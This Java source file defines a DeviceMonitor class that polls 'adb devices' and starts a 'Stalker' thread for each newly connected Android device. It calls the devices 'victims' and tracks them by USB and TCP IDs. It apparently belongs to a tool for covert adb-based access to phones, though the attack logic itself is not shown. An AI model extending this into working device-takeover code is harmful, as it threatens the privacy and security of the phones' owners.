package core;

import java.util.ArrayList;

/**
 * DeviceMonitor monitors Android devices connected to this machine, and:
 * (1) starts new Stalker thread for newly connected device,
 * (2) removes Stalker of disconnected victims
 * 
 * */

public class DeviceMonitor implements Runnable{

	private ArrayList<Stalker> stalkers;
	public static ArrayList<DeviceInfo> victims;
	public static ArrayList<String> adbDevices;
	
	public static boolean debug = false;
	
	public DeviceMonitor()
	{
		stalkers = new ArrayList<Stalker>();
		victims = new ArrayList<DeviceInfo>();
		adbDevices = new ArrayList<String>();
	}


	@Override
	public void run()
	{
		while (true)
		{
			adbDevices = Adb.getDevices();
			if (debug)
			{
				P.print("----- adb devices -----");
				P.print(adbDevices);
			}
			for (String deviceID : adbDevices)
			{
				if (!deviceID.endsWith(":"+Adb.tcpPort) && !hasStalker(deviceID))
				{
					Stalker s = new Stalker(new DeviceInfo(deviceID));
					s.start();
					stalkers.add(s);
				}
			}
			
			ArrayList<Stalker> newStalkers = new ArrayList<>();
			for (Stalker s : stalkers)
				if (s.victimConnected)
					newStalkers.add(s);
			stalkers = newStalkers;
			
			if (debug)
			{
				P.print("\n-- victim count: " + stalkers.size());
				for (Stalker s : stalkers)
				{
					P.print("[victim] " + s.device.tcpID+"\t" + s.device.usbID);
				}
			}
			wait(500);
		}
	}
	
	public void start()
	{
		new Thread(this).start();
	}
	
	boolean hasStalker(String deviceID)
	{
		for (Stalker stalker : stalkers)
		{
			if (stalker.device.is(deviceID))
			{
				return true;
			}
		}
		return false;
	}
	


	private void wait(int milliseconds)
	{
		try
		{
			Thread.sleep(milliseconds);
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
	
}
